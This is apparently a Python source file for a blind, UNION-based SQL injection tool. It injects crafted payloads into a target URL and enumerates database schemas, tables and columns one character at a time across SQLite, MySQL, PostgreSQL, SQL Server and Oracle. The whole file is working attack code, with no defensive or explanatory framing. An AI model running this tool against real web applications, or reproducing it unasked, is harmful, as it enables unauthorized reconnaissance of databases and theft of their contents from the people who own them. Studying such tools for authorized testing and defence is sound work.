from sys import exit
from enum import Enum
from http_utils import request_handler


CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'


def enumerate(opts, poison, base_poison, known_list, name_alias):
    known_chars = ""
    verified = False

    while not verified:
        iteration_interrupted = False
        for char in CHARS:
            poison_str = poison + base_poison + known_chars + char + "%'"
            if known_list:
                poison_str += "".join(
                    [f" AND {name_alias} != '{e}'" for e in known_list]
                )
            poison_str += "; -- "

            poison_url = opts.URL.replace("FUZZ", poison_str)
            response = request_handler(opts.METHOD, poison_url,
                                       opts.DATA, poison_str)
            response = response.text

            if opts.SUCCESS_STR in response and opts.ERROR_STR in response:
                print(
                    '[x] Response reading ambiguous, try specifying response strings')
                exit(1)
            elif opts.SUCCESS_STR in response:
                known_chars += char
                iteration_interrupted = True
                break

        if not iteration_interrupted and known_chars != "":
            known_list.append(known_chars)
            known_chars = ""
        elif not iteration_interrupted:
            return known_list


class Sqlite_Enumerator():
    def enumerate_table(self, opts, poison):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT name{
            nulls} FROM sqlite_master WHERE type='table' AND name LIKE '"

        return enumerate(opts, poison, base_poison, [], "name")

    def enumerate_columns(self, opts, poison, table_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = (
            f"SELECT p.name{nulls} FROM sqlite_master AS m "
            f"JOIN pragma_table_info('{table_name}') AS p "
            f"WHERE m.type='table' AND p.name LIKE '"
        )

        return enumerate(opts, poison, base_poison, [], "p.name")


class Mysql_Enumerator():
    def enumerate_schemas(self, opts, poison):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT table_schema{
            nulls} FROM information_schema.tables WHERE "
        if not opts.INCLUDE_SYSTEM_TABLES:
            base_poison += "table_schema NOT IN ('information_schema', 'performance_schema', 'mysql', 'sys') AND "
        base_poison += "table_schema LIKE '"

        return enumerate(opts, poison, base_poison, [], "table_schema")

    def enumerate_table(self, opts, poison, schema_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT table_name{
            nulls} FROM information_schema.tables WHERE table_schema='{schema_name}' AND table_name LIKE '"

        return enumerate(opts, poison, base_poison, [], "table_name")

    def enumerate_columns(self, opts, poison, schema_name, table_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = (
            f"SELECT column_name{nulls} FROM information_schema.columns WHERE table_schema='{schema_name}' AND table_name='{
                table_name}' AND column_name LIKE '"
        )

        return enumerate(opts, poison, base_poison, [], "column_name")


class CastType(Enum):
    NUMERIC = 0
    ALNUM = 1
    # possibly dates? idk dude, this type casting shit is frying my brain


class Postgresql_Enumerator():
    def _wrap_in_cast(self, value, cast_type=CastType.ALNUM):
        if cast_type is CastType.ALNUM:
            return f"{value}::text"
        elif cast_type is CastType.NUMERIC:
            return '(regexp_match(' + value + r", '\d+'))[1]::int"
        else:
            print("Unsupported Cast Type")
            exit(1)

    def determine_column_type(self, opts):
        class Type(Enum):
            TEXT = r"SELECT version()"
            NUMERIC = r"SELECT (regexp_match(version(), '\d+'))[1]::int"

        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poisons = ["' UNION ", "0 UNION "]
        poisons = [Type.NUMERIC, Type.TEXT]

        for base_poison in base_poisons:
            for poison in poisons:
                poison_str = f"{base_poison}{poison.value}{nulls}; -- "
                target = opts.URL.replace("FUZZ", poison_str)
                result = request_handler(
                    opts.METHOD, target, opts.DATA, poison_str)
                result = result.text

                if opts.ERROR_STR not in result:  # we be a lil' loosey goosey
                    # TODO: expand this
                    if poison == Type.NUMERIC:
                        return CastType.NUMERIC
                    else:
                        return CastType.ALNUM

    def enumerate_schemas(self, opts, poison, cast_type):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])

        select = "table_schema"
        if cast_type is not None:
            select = self._wrap_in_cast(select, cast_type)

        base_poison = f"SELECT {select}{
            nulls} FROM information_schema.tables WHERE "
        if not opts.INCLUDE_SYSTEM_TABLES:
            base_poison += "table_schema NOT IN ('pg_catalog', 'information_schema') AND "
        base_poison += "table_schema LIKE '"

        return enumerate(opts, poison, base_poison, [], "table_schema")

    def enumerate_table(self, opts, poison, schema_name, cast_type=CastType.ALNUM):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])

        select = "table_name"
        if cast_type is not None:
            select = self._wrap_in_cast(select, cast_type)

        base_poison = f"SELECT {select}{
            nulls} FROM information_schema.tables WHERE table_schema='{schema_name}' AND table_name LIKE '"

        return enumerate(opts, poison, base_poison, [], "table_name")

    def enumerate_columns(self, opts, poison, schema_name, table_name, cast_type=CastType.ALNUM):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])

        select = "column_name"
        if cast_type is not None:
            select = self._wrap_in_cast(select, cast_type)

        base_poison = (
            f"SELECT {select}{nulls} FROM information_schema.columns WHERE table_schema='{schema_name}' AND table_name='{
                table_name}' AND column_name LIKE '"
        )

        return enumerate(opts, poison, base_poison, [], "column_name")


# WARNING: UNTESTED
class SqlServer_Enumerator():
    def enumerate_schemas(self, opts, poison):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT schema_name{
            nulls} FROM information_schema.schemata WHERE "
        if not opts.INCLUDE_SYSTEM_TABLES:
            base_poison += "schema_name NOT IN ('INFORMATION_SCHEMA', 'sys') AND "
        base_poison += "schema_name LIKE '"

        return enumerate(opts, poison, base_poison, [], "schema_name")

    def enumerate_table(self, opts, poison, schema_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT table_name{nulls} FROM information_schema.tables WHERE table_schema='{
            schema_name}' AND table_name LIKE '"

        return enumerate(opts, poison, base_poison, [], "table_name")

    def enumerate_columns(self, opts, poison, schema_name, table_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT column_name{nulls} FROM information_schema.columns WHERE table_schema='{
            schema_name}' AND table_name='{table_name}' AND column_name LIKE '"

        return enumerate(opts, poison, base_poison, [], "column_name")


# WARNING: UNTESTED
class OracleSQL_Enumerator():
    def enumerate_schemas(self, opts, poison):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT username{nulls} FROM all_users WHERE "
        if not opts.INCLUDE_SYSTEM_TABLES:
            base_poison += "username NOT IN ('SYS', 'SYSTEM', 'OUTLN', 'XDB', 'CTXSYS', 'DBSNMP') AND "
        base_poison += "username LIKE '"

        return enumerate(opts, poison, base_poison, [], "username")

    def enumerate_table(self, opts, poison, schema_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT table_name{nulls} FROM all_tables WHERE owner='{
            schema_name}' AND table_name LIKE '"

        return enumerate(opts, poison, base_poison, [], "table_name")

    def enumerate_columns(self, opts, poison, schema_name, table_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT column_name{nulls} FROM all_tab_columns WHERE owner='{
            schema_name}' AND table_name='{table_name}' AND column_name LIKE '"

        return enumerate(opts, poison, base_poison, [], "column_name")
